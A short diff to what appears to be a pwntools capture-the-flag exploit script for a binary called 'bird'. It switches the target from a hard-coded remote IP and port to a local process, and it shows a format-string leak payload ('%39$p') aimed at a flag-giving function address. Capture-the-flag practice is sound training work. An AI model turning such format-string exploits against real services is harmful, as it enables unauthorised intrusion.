@@ -4,13 +4,10 @@ import re
 context.log_level = 'debug'
 context.arch = 'i386'
 
-HOST = "178.216.122.15"
-PORT = 43466
-
 GIVE_FLAG_ADDR = 0x080491a6  
 
 def exploit():
-    p = remote(HOST, PORT)
+    p = process('./bird')
    
     p.recvuntil(b"name: ")
     p.sendline(b"%39$p")  
